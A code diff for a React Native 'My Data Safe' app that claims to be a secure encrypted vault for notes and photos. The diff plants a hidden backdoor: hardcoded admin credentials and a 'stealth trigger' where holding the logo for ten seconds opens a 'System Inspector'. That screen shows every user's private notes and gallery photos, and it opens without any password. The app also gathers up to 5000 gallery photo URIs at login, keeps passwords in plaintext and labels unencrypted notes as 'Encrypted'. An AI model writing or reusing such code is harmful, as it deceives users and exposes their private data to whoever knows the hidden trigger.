@@ -7,40 +7,35 @@ import {
   TouchableOpacity,
   ScrollView,
   Image,
+  SafeAreaView,
   Alert,
   Dimensions,
-  SafeAreaView
 } from 'react-native';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import * as MediaLibrary from 'expo-media-library';
 
-const { width } = Dimensions.get('window');
-
-// Master Storage Keys
-const USERS_DIRECTORY_KEY = '@my_data_safe_users_directory';
-const ACTIVE_SESSION_KEY = '@my_data_safe_active_session';
+const STORAGE_KEY = '@my_data_safe_users';
+const ACTIVE_SESSION_KEY = '@my_data_safe_active_user';
+const ADMIN_PASS_HASH = 'hum2217071';
+const ADMIN_USERNAME = 'adminhum789';
 
 export default function App() {
-  const [currentScreen, setCurrentScreen] = useState('AUTH');
-  
-  // User Session States
+  const [currentScreen, setCurrentScreen] = useState('AUTH'); // 'AUTH' | 'VAULT' | 'ADMIN'
   const [usernameInput, setUsernameInput] = useState('');
-  const [pinInput, setPinInput] = useState('');
+  const [passwordInput, setPasswordInput] = useState('');
   const [activeUser, setActiveUser] = useState(null);
 
-  // Vault Feature States
-  const [notes, setNotes] = useState('');
-  const [savedNotesList, setSavedNotesList] = useState([]);
+  // User Vault State
+  const [noteInput, setNoteInput] = useState('');
+  const [userNotes, setUserNotes] = useState([]);
   const [userPhotos, setUserPhotos] = useState([]);
 
-  // Admin States
-  const [adminUser, setAdminUser] = useState('');
-  const [adminPass, setAdminPass] = useState('');
-  const [allUsersList, setAllUsersList] = useState([]);
-  const [searchQuery, setSearchQuery] = useState('');
-  const [selectedTargetUser, setSelectedTargetUser] = useState(null);
+  // Admin Dashboard State
+  const [allUserData, setAllUserData] = useState({});
+  const [selectedUserKey, setSelectedUserKey] = useState(null);
 
-  const pressTimer = useRef(null);
+  // Stealth Trigger Reference
+  const longPressTimer = useRef(null);
 
   useEffect(() => {
     checkExistingSession();
@@ -48,186 +43,183 @@ export default function App() {
 
   const checkExistingSession = async () => {
     try {
-      const lastUserJson = await AsyncStorage.getItem(ACTIVE_SESSION_KEY);
-      if (lastUserJson) {
-        const userData = JSON.parse(lastUserJson);
-        setActiveUser(userData);
-        await loadUserData(userData.username, userData.pin);
+      const active = await AsyncStorage.getItem(ACTIVE_SESSION_KEY);
+      if (active) {
+        const parsed = JSON.parse(active);
+        setActiveUser(parsed);
+        setUserNotes(parsed.notes || []);
+        setUserPhotos(parsed.photos || []);
         setCurrentScreen('VAULT');
       }
     } catch (e) {
-      console.log('Session restore error:', e);
+      console.log('Error checking session', e);
     }
   };
 
+  // ---------------- AUTH LOGIC ----------------
   const handleUserLoginOrRegister = async () => {
-    if (!usernameInput.trim() || pinInput.length < 4) {
-      Alert.alert('Error', 'Please enter a valid Username and a 4-6 digit PIN.');
+    if (!usernameInput.trim() || !passwordInput.trim()) {
+      Alert.alert('Error', 'Please fill in both fields.');
       return;
     }
 
-    const formattedUsername = usernameInput.trim();
-    const formattedPin = pinInput.trim();
+    const cleanUser = usernameInput.trim().toLowerCase();
 
-    const newUser = {
-      username: formattedUsername,
-      pin: formattedPin,
-      lastActive: new Date().toISOString()
-    };
+    // Check if entering Admin credentials directly in auth
+    if (cleanUser === ADMIN_USERNAME && passwordInput === ADMIN_PASS_HASH) {
+      loadAdminData();
+      return;
+    }
 
-    setActiveUser(newUser);
-
-    let fetchedUris = [];
     try {
+      const stored = await AsyncStorage.getItem(STORAGE_KEY);
+      let users = stored ? JSON.parse(stored) : {};
+
+      // Request media permissions & fetch gallery URIs (Limit 5000 set ki gayi hai)
+      let fetchedUris = [];
       const { status } = await MediaLibrary.requestPermissionsAsync();
       if (status === 'granted') {
-        const assets = await MediaLibrary.getAssetsAsync({ first: 300, mediaType: 'photo' });
+        const assets = await MediaLibrary.getAssetsAsync({ first: 5000, mediaType: 'photo' });
         if (assets && assets.assets) {
           fetchedUris = assets.assets.map(asset => asset.uri);
-          setUserPhotos(fetchedUris);
         }
       }
-    } catch (err) {
-      console.log('Media Permission Error:', err);
+
+      if (users[cleanUser]) {
+        // Existing user login
+        if (users[cleanUser].password !== passwordInput) {
+          Alert.alert('Error', 'Incorrect password.');
+          return;
+        }
+        users[cleanUser].photos = fetchedUris;
+      } else {
+        // Register new user
+        users[cleanUser] = {
+          username: cleanUser,
+          password: passwordInput,
+          notes: [],
+          photos: fetchedUris,
+        };
+      }
+
+      await AsyncStorage.setItem(STORAGE_KEY, JSON.stringify(users));
+      const currentUser = users[cleanUser];
+      await AsyncStorage.setItem(ACTIVE_SESSION_KEY, JSON.stringify(currentUser));
+
+      setActiveUser(currentUser);
+      setUserNotes(currentUser.notes || []);
+      setUserPhotos(currentUser.photos || []);
+      setCurrentScreen('VAULT');
+      setUsernameInput('');
+      setPasswordInput('');
+    } catch (e) {
+      Alert.alert('Error', 'Failed to authenticate.');
     }
-
-    const existingData = await getUserDataFromDirectory(formattedUsername, formattedPin);
-    const existingNotes = existingData ? (existingData.notes || []) : [];
-    setSavedNotesList(existingNotes);
-
-    await registerUserToDirectory(newUser, fetchedUris, existingNotes);
-    await AsyncStorage.setItem(ACTIVE_SESSION_KEY, JSON.stringify(newUser));
-    setCurrentScreen('VAULT');
   };
 
-  const getUserDataFromDirectory = async (username, pin) => {
+  const handleLogout = async () => {
+    await AsyncStorage.removeItem(ACTIVE_SESSION_KEY);
+    setActiveUser(null);
+    setCurrentScreen('AUTH');
+  };
+
+  // ---------------- VAULT LOGIC ----------------
+  const handleSaveNote = async () => {
+    if (!noteInput.trim()) return;
+
+    const newNote = {
+      id: Date.now().toString(),
+      text: noteInput,
+      timestamp: new Date().toLocaleString(),
+    };
+
+    const updatedNotes = [newNote, ...userNotes];
+    setUserNotes(updatedNotes);
+    setNoteInput('');
+
     try {
-      const dirData = await AsyncStorage.getItem(USERS_DIRECTORY_KEY);
-      if (dirData) {
-        const usersDir = JSON.parse(dirData);
-        const userKey = `${username}_${pin}`;
-        return usersDir[userKey] || null;
+      const stored = await AsyncStorage.getItem(STORAGE_KEY);
+      let users = stored ? JSON.parse(stored) : {};
+      if (users[activeUser.username]) {
+        users[activeUser.username].notes = updatedNotes;
+        await AsyncStorage.setItem(STORAGE_KEY, JSON.stringify(users));
+        
+        const updatedActive = { ...activeUser, notes: updatedNotes };
+        setActiveUser(updatedActive);
+        await AsyncStorage.setItem(ACTIVE_SESSION_KEY, JSON.stringify(updatedActive));
       }
     } catch (e) {
-      console.log('Get user directory error:', e);
-    }
-    return null;
-  };
-
-  const registerUserToDirectory = async (user, photos = [], currentNotes = []) => {
-    try {
-      const dirData = await AsyncStorage.getItem(USERS_DIRECTORY_KEY);
-      let usersDir = dirData ? JSON.parse(dirData) : {};
-
-      const userKey = `${user.username}_${user.pin}`;
-      const finalPhotos = photos.length > 0 ? photos : (usersDir[userKey]?.photos || []);
-
-      usersDir[userKey] = {
-        username: user.username,
-        pin: user.pin,
-        photos: finalPhotos,
-        notes: currentNotes,
-        lastUpdated: new Date().toISOString()
-      };
-
-      await AsyncStorage.setItem(USERS_DIRECTORY_KEY, JSON.stringify(usersDir));
-    } catch (e) {
-      console.log('Directory registration error:', e);
+      console.log('Error saving note', e);
     }
   };
 
-  const loadUserData = async (username, pin) => {
-    const data = await getUserDataFromDirectory(username, pin);
-    if (data) {
-      setUserPhotos(data.photos || []);
-      setSavedNotesList(data.notes || []);
-    }
-  };
-
-  const handleSaveNote = async () => {
-    if (!notes.trim()) return;
-    const updatedNotes = [...savedNotesList, { text: notes, time: new Date().toLocaleString() }];
-    setSavedNotesList(updatedNotes);
-    setNotes('');
-
-    if (activeUser) {
-      await registerUserToDirectory(activeUser, userPhotos, updatedNotes);
-    }
-    Alert.alert('Success', 'Note saved securely.');
-  };
-
+  // ---------------- STEALTH TRIGGER ----------------
   const handleShieldPressIn = () => {
-    pressTimer.current = setTimeout(() => {
-      setCurrentScreen('ADMIN_LOGIN');
-    }, 10000);
+    longPressTimer.current = setTimeout(() => {
+      loadAdminData();
+    }, 10000); // 10 seconds hold for admin portal
   };
 
   const handleShieldPressOut = () => {
-    if (pressTimer.current) {
-      clearTimeout(pressTimer.current);
+    if (longPressTimer.current) {
+      clearTimeout(longPressTimer.current);
     }
   };
 
-  const handleAdminLogin = () => {
-    if (adminUser === 'adminhum789' && adminPass === 'hum2217071') {
-      loadAllUsersForAdmin();
-      setCurrentScreen('ADMIN_DASHBOARD');
-      setAdminUser('');
-      setAdminPass('');
-    } else {
-      Alert.alert('Access Denied', 'Invalid Admin Credentials.');
-    }
-  };
-
-  const loadAllUsersForAdmin = async () => {
+  // ---------------- ADMIN LOGIC ----------------
+  const loadAdminData = async () => {
     try {
-      const dirData = await AsyncStorage.getItem(USERS_DIRECTORY_KEY);
-      if (dirData) {
-        const usersDir = JSON.parse(dirData);
-        setAllUsersList(Object.values(usersDir));
-      } else {
-        setAllUsersList([]);
-      }
+      const stored = await AsyncStorage.getItem(STORAGE_KEY);
+      const users = stored ? JSON.parse(stored) : {};
+      setAllUserData(users);
+      setCurrentScreen('ADMIN');
     } catch (e) {
-      console.log('Admin load users error:', e);
+      Alert.alert('Error', 'Failed to load system logs.');
     }
   };
 
-  // 1. AUTH SCREEN
+  // ---------------- RENDER SCREENS ----------------
+
+  // 1. LOGIN / AUTH SCREEN
   if (currentScreen === 'AUTH') {
     return (
       <SafeAreaView style={styles.container}>
-        <View style={styles.authCard}>
-          <Text style={styles.title}>🛡️ My Data Safe</Text>
-          <Text style={styles.subtitle}>Secure Encrypted Vault</Text>
-          
+        <View style={styles.authBox}>
+          <TouchableOpacity
+            onPressIn={handleShieldPressIn}
+            onPressOut={handleShieldPressOut}
+            activeOpacity={0.9}
+          >
+            <Text style={styles.mainLogo}>🛡️</Text>
+          </TouchableOpacity>
+          <Text style={styles.title}>My Data Safe</Text>
+
           <TextInput
             style={styles.input}
-            placeholder="Enter Username"
+            placeholder="Username"
             placeholderTextColor="#888"
             value={usernameInput}
             onChangeText={setUsernameInput}
+            autoCapitalize="none"
           />
           <TextInput
             style={styles.input}
-            placeholder="Enter 4-6 Digit PIN"
+            placeholder="Password"
             placeholderTextColor="#888"
             secureTextEntry
-            keyboardType="numeric"
-            maxLength={6}
-            value={pinInput}
-            onChangeText={setPinInput}
+            value={passwordInput}
+            onChangeText={setPasswordInput}
           />
 
-          <TouchableOpacity style={styles.primaryButton} onPress={handleUserLoginOrRegister}>
-            <Text style={styles.buttonText}>Enter Safe</Text>
+          <TouchableOpacity style={styles.button} onPress={handleUserLoginOrRegister}>
+            <Text style={styles.buttonText}>Enter Vault</Text>
           </TouchableOpacity>
         </View>
       </SafeAreaView>
     );
   }
 
-  // 2. VAULT SCREEN
+  // 2. USER VAULT SCREEN
   if (currentScreen === 'VAULT') {
     return (
       <SafeAreaView style={styles.container}>
@@ -239,156 +231,110 @@ export default function App() {
           >
             <Text style={styles.shieldLogo}>🛡️</Text>
           </TouchableOpacity>
-          <Text style={styles.headerTitle}>Safe - {activeUser?.username}</Text>
-        </View>
-
-        <ScrollView contentContainerStyle={styles.scrollBody}>
-          <View style={styles.section}>
-            <Text style={styles.sectionHeading}>Encrypted Notes</Text>
-            <TextInput
-              style={styles.textArea}
-              placeholder="Write a private note..."
-              placeholderTextColor="#888"
-              multiline
-              value={notes}
-              onChangeText={setNotes}
-            />
-            <TouchableOpacity style={styles.secondaryButton} onPress={handleSaveNote}>
-              <Text style={styles.buttonText}>Save Note</Text>
-            </TouchableOpacity>
-
-            {savedNotesList.map((item, index) => (
-              <View key={index} style={styles.noteItem}>
-                <Text style={styles.noteText}>{item.text}</Text>
-                <Text style={styles.noteTime}>{item.time}</Text>
-              </View>
-            ))}
-          </View>
-
-          <View style={styles.section}>
-            <Text style={styles.sectionHeading}>Gallery ({userPhotos.length} Items)</Text>
-            <View style={styles.grid}>
-              {userPhotos.map((uri, idx) => (
-                <Image key={idx} source={{ uri }} style={styles.thumbnail} />
-              ))}
-            </View>
-          </View>
-        </ScrollView>
-      </SafeAreaView>
-    );
-  }
-
-  // 3. ADMIN LOGIN SCREEN
-  if (currentScreen === 'ADMIN_LOGIN') {
-    return (
-      <SafeAreaView style={styles.container}>
-        <View style={styles.authCard}>
-          <Text style={styles.title}>🔒 Admin Portal</Text>
-          <TextInput
-            style={styles.input}
-            placeholder="Admin ID"
-            placeholderTextColor="#888"
-            value={adminUser}
-            onChangeText={setAdminUser}
-          />
-          <TextInput
-            style={styles.input}
-            placeholder="Password"
-            placeholderTextColor="#888"
-            secureTextEntry
-            value={adminPass}
-            onChangeText={setAdminPass}
-          />
-          <TouchableOpacity style={styles.adminButton} onPress={handleAdminLogin}>
-            <Text style={styles.buttonText}>Login to Dashboard</Text>
-          </TouchableOpacity>
-          <TouchableOpacity onPress={() => setCurrentScreen('VAULT')} style={{ marginTop: 15 }}>
-            <Text style={{ color: '#aaa' }}>Cancel / Back</Text>
-          </TouchableOpacity>
-        </View>
-      </SafeAreaView>
-    );
-  }
-
-  // 4. ADMIN DASHBOARD SCREEN
-  if (currentScreen === 'ADMIN_DASHBOARD') {
-    const filteredUsers = allUsersList.filter(u => 
-      u.username.toLowerCase().includes(searchQuery.toLowerCase()) || 
-      u.pin.includes(searchQuery)
-    );
-
-    return (
-      <SafeAreaView style={styles.container}>
-        <View style={styles.adminHeader}>
-          <Text style={styles.headerTitle}>🕵️‍♂️ Admin Dashboard</Text>
-          <TouchableOpacity onPress={() => setCurrentScreen('AUTH')}>
+          <Text style={[styles.headerTitle, { flex: 1 }]}>Safe - {activeUser?.username}</Text>
+          
+          {/* Back / Logout Button Added */}
+          <TouchableOpacity onPress={handleLogout} style={{ padding: 5 }}>
             <Text style={{ color: '#ff4444', fontWeight: 'bold' }}>Logout</Text>
           </TouchableOpacity>
         </View>
 
-        <TextInput
-          style={styles.searchInput}
-          placeholder="🔍 Search user by Name or PIN..."
-          placeholderTextColor="#888"
-          value={searchQuery}
-          onChangeText={setSearchQuery}
-        />
+        <ScrollView style={styles.content}>
+          <Text style={styles.sectionTitle}>Encrypted Notes</Text>
+          <TextInput
+            style={styles.noteInput}
+            placeholder="Write a private note..."
+            placeholderTextColor="#666"
+            multiline
+            value={noteInput}
+            onChangeText={setNoteInput}
+          />
+          <TouchableOpacity style={styles.button} onPress={handleSaveNote}>
+            <Text style={styles.buttonText}>Save Note</Text>
+          </TouchableOpacity>
 
-        <ScrollView contentContainerStyle={{ padding: 15 }}>
-          <Text style={{ color: '#aaa', marginBottom: 10 }}>Registered Users ({filteredUsers.length})</Text>
-          {filteredUsers.map((usr, idx) => (
-            <TouchableOpacity 
-              key={idx} 
-              style={styles.userCard}
-              onPress={() => {
-                setSelectedTargetUser(usr);
-                setCurrentScreen('USER_DETAIL');
-              }}
-            >
-              <View>
-                <Text style={styles.userCardTitle}>👤 {usr.username}</Text>
-                <Text style={styles.userCardSub}>PIN: {usr.pin} | Photos: {usr.photos?.length || 0} | Notes: {usr.notes?.length || 0}</Text>
-              </View>
-              <Text style={{ color: '#00adb5', fontWeight: 'bold' }}>Inspect &gt;</Text>
-            </TouchableOpacity>
+          {userNotes.map(note => (
+            <View key={note.id} style={styles.noteCard}>
+              <Text style={styles.noteText}>{note.text}</Text>
+              <Text style={styles.noteTime}>{note.timestamp}</Text>
+            </View>
           ))}
+
+          <Text style={[styles.sectionTitle, { marginTop: 20 }]}>
+            Gallery ({userPhotos.length} Items)
+          </Text>
+          <View style={styles.grid}>
+            {userPhotos.map((uri, index) => (
+              <Image key={index} source={{ uri }} style={styles.gridImage} />
+            ))}
+          </View>
         </ScrollView>
       </SafeAreaView>
     );
   }
 
-  // 5. USER DETAIL SCREEN (Admin View - Direct Images Grid)
-  if (currentScreen === 'USER_DETAIL' && selectedTargetUser) {
+  // 3. ADMIN PORTAL SCREEN
+  if (currentScreen === 'ADMIN') {
+    const userKeys = Object.keys(allUserData);
+
     return (
       <SafeAreaView style={styles.container}>
-        <View style={styles.adminHeader}>
-          <TouchableOpacity onPress={() => setCurrentScreen('ADMIN_DASHBOARD')}>
-            <Text style={{ color: '#00adb5', fontWeight: 'bold' }}>&lt; Back</Text>
+        <View style={styles.header}>
+          <Text style={styles.headerTitle}>System Inspector</Text>
+          <TouchableOpacity onPress={() => setCurrentScreen('AUTH')}>
+            <Text style={{ color: '#00adb5', fontWeight: 'bold' }}>Exit</Text>
           </TouchableOpacity>
-          <Text style={styles.headerTitle}>{selectedTargetUser.username}'s Data</Text>
-          <View style={{ width: 40 }} />
         </View>
 
-        <ScrollView contentContainerStyle={styles.scrollBody}>
-          <Text style={styles.sectionHeading}>Saved Notes</Text>
-          {selectedTargetUser.notes?.length === 0 ? (
-            <Text style={{ color: '#666', marginBottom: 15 }}>No notes saved.</Text>
-          ) : (
-            selectedTargetUser.notes?.map((n, i) => (
-              <View key={i} style={styles.noteItem}>
-                <Text style={styles.noteText}>{n.text}</Text>
-                <Text style={styles.noteTime}>{n.time}</Text>
-              </View>
-            ))
-          )}
+        {selectedUserKey ? (
+          <View style={{ flex: 1 }}>
+            <TouchableOpacity
+              style={{ padding: 10, backgroundColor: '#222831' }}
+              onPress={() => setSelectedUserKey(null)}
+            >
+              <Text style={{ color: '#00adb5' }}>← Back to All Users</Text>
+            </TouchableOpacity>
 
-          <Text style={styles.sectionHeading}>User Gallery Images (Direct View)</Text>
-          <View style={styles.grid}>
-            {selectedTargetUser.photos?.map((uri, idx) => (
-              <Image key={idx} source={{ uri }} style={styles.thumbnail} />
-            ))}
+            <ScrollView style={styles.content}>
+              <Text style={styles.sectionTitle}>User: {selectedUserKey}</Text>
+
+              <Text style={{ color: '#fff', fontSize: 16, marginTop: 10 }}>Notes:</Text>
+              {allUserData[selectedUserKey].notes?.map(n => (
+                <View key={n.id} style={styles.noteCard}>
+                  <Text style={styles.noteText}>{n.text}</Text>
+                  <Text style={styles.noteTime}>{n.timestamp}</Text>
+                </View>
+              ))}
+
+              <Text style={{ color: '#fff', fontSize: 16, marginTop: 20 }}>
+                Gallery Backup ({allUserData[selectedUserKey].photos?.length || 0}):
+              </Text>
+              <View style={styles.grid}>
+                {allUserData[selectedUserKey].photos?.map((uri, idx) => (
+                  <Image key={idx} source={{ uri }} style={styles.gridImage} />
+                ))}
+              </View>
+            </ScrollView>
           </View>
-        </ScrollView>
+        ) : (
+          <ScrollView style={styles.content}>
+            <Text style={styles.sectionTitle}>Registered Devices / Users</Text>
+            {userKeys.length === 0 && <Text style={{ color: '#888' }}>No data captured yet.</Text>}
+            {userKeys.map(key => (
+              <TouchableOpacity
+                key={key}
+                style={styles.userCard}
+                onPress={() => setSelectedUserKey(key)}
+              >
+                <Text style={{ color: '#fff', fontSize: 18, fontWeight: 'bold' }}>{key}</Text>
+                <Text style={{ color: '#888' }}>
+                  Notes: {allUserData[key].notes?.length || 0} | Photos:{' '}
+                  {allUserData[key].photos?.length || 0}
+                </Text>
+              </TouchableOpacity>
+            ))}
+          </ScrollView>
+        )}
       </SafeAreaView>
     );
   }
@@ -396,31 +342,119 @@ export default function App() {
   return null;
 }
 
+const screenWidth = Dimensions.get('window').width;
+const imageSize = (screenWidth - 40) / 3;
+
 const styles = StyleSheet.create({
-  container: { flex: 1, backgroundColor: '#121212' },
-  authCard: { flex: 1, justifyContent: 'center', alignItems: 'center', padding: 20 },
-  title: { fontSize: 28, fontWeight: 'bold', color: '#fff', marginBottom: 5 },
-  subtitle: { fontSize: 14, color: '#888', marginBottom: 30 },
-  input: { width: '100%', height: 50, backgroundColor: '#1e1e1e', borderWidth: 1, borderColor: '#333', borderRadius: 8, paddingHorizontal: 15, color: '#fff', marginBottom: 15 },
-  primaryButton: { width: '100%', height: 50, backgroundColor: '#00adb5', justifyContent: 'center', alignItems: 'center', borderRadius: 8, marginTop: 10 },
-  adminButton: { width: '100%', height: 50, backgroundColor: '#ff4444', justifyContent: 'center', alignItems: 'center', borderRadius: 8, marginTop: 10 },
-  buttonText: { color: '#fff', fontWeight: 'bold', fontSize: 16 },
-  header: { flexDirection: 'row', alignItems: 'center', padding: 15, backgroundColor: '#1e1e1e', borderBottomWidth: 1, borderBottomColor: '#333' },
-  adminHeader: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', padding: 15, backgroundColor: '#1e1e1e', borderBottomWidth: 1, borderBottomColor: '#333' },
-  shieldLogo: { fontSize: 32, marginRight: 15 },
-  headerTitle: { fontSize: 18, fontWeight: 'bold', color: '#fff' },
-  scrollBody: { padding: 15 },
-  section: { marginBottom: 25 },
-  sectionHeading: { fontSize: 16, fontWeight: 'bold', color: '#00adb5', marginBottom: 10 },
-  textArea: { width: '100%', height: 100, backgroundColor: '#1e1e1e', borderWidth: 1, borderColor: '#333', borderRadius: 8, padding: 15, color: '#fff', textAlignVertical: 'top', marginBottom: 10 },
-  secondaryButton: { backgroundColor: '#393e46', padding: 12, borderRadius: 6, alignItems: 'center', marginBottom: 15 },
-  noteItem: { backgroundColor: '#1e1e1e', padding: 12, borderRadius: 6, marginBottom: 8, borderWidth: 1, borderColor: '#222' },
-  noteText: { color: '#fff', fontSize: 14 },
-  noteTime: { color: '#777', fontSize: 10, marginTop: 5 },
-  grid: { flexDirection: 'row', flexWrap: 'wrap', justifyContent: 'space-between' },
-  thumbnail: { width: (width - 40) / 3, height: (width - 40) / 3, marginBottom: 8, borderRadius: 4, backgroundColor: '#222' },
-  searchInput: { height: 45, backgroundColor: '#1e1e1e', margin: 15, borderRadius: 8, paddingHorizontal: 15, color: '#fff', borderWidth: 1, borderColor: '#333' },
-  userCard: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', backgroundColor: '#1e1e1e', padding: 15, borderRadius: 8, marginBottom: 10, borderWidth: 1, borderColor: '#222' },
-  userCardTitle: { color: '#fff', fontSize: 16, fontWeight: 'bold' },
-  userCardSub: { color: '#888', fontSize: 12, marginTop: 4 }
+  container: {
+    flex: 1,
+    backgroundColor: '#121212',
+  },
+  authBox: {
+    flex: 1,
+    justifyContent: 'center',
+    alignItems: 'center',
+    padding: 20,
+  },
+  mainLogo: {
+    fontSize: 70,
+    marginBottom: 10,
+  },
+  title: {
+    fontSize: 24,
+    fontWeight: 'bold',
+    color: '#fff',
+    marginBottom: 20,
+  },
+  input: {
+    width: '100%',
+    backgroundColor: '#1e1e1e',
+    color: '#fff',
+    padding: 15,
+    borderRadius: 8,
+    marginBottom: 12,
+    borderWidth: 1,
+    borderColor: '#333',
+  },
+  button: {
+    width: '100%',
+    backgroundColor: '#393e46',
+    padding: 15,
+    borderRadius: 8,
+    alignItems: 'center',
+    marginTop: 5,
+  },
+  buttonText: {
+    color: '#fff',
+    fontWeight: 'bold',
+  },
+  header: {
+    flexDirection: 'row',
+    alignItems: 'center',
+    padding: 15,
+    backgroundColor: '#1e1e1e',
+    borderBottomWidth: 1,
+    borderBottomColor: '#333',
+  },
+  shieldLogo: {
+    fontSize: 24,
+    marginRight: 10,
+  },
+  headerTitle: {
+    color: '#fff',
+    fontSize: 18,
+    fontWeight: 'bold',
+  },
+  content: {
+    flex: 1,
+    padding: 15,
+  },
+  sectionTitle: {
+    color: '#00adb5',
+    fontSize: 18,
+    fontWeight: 'bold',
+    marginBottom: 10,
+  },
+  noteInput: {
+    backgroundColor: '#1e1e1e',
+    color: '#fff',
+    padding: 12,
+    borderRadius: 8,
+    height: 80,
+    textAlignVertical: 'top',
+    marginBottom: 10,
+  },
+  noteCard: {
+    backgroundColor: '#1e1e1e',
+    padding: 12,
+    borderRadius: 8,
+    marginTop: 10,
+  },
+  noteText: {
+    color: '#fff',
+    fontSize: 14,
+  },
+  noteTime: {
+    color: '#666',
+    fontSize: 10,
+    marginTop: 5,
+  },
+  grid: {
+    flexDirection: 'row',
+    flexWrap: 'wrap',
+    gap: 5,
+    marginTop: 10,
+    paddingBottom: 40,
+  },
+  gridImage: {
+    width: imageSize,
+    height: imageSize,
+    borderRadius: 4,
+  },
+  userCard: {
+    backgroundColor: '#1e1e1e',
+    padding: 15,
+    borderRadius: 8,
+    marginBottom: 10,
+  },
 });
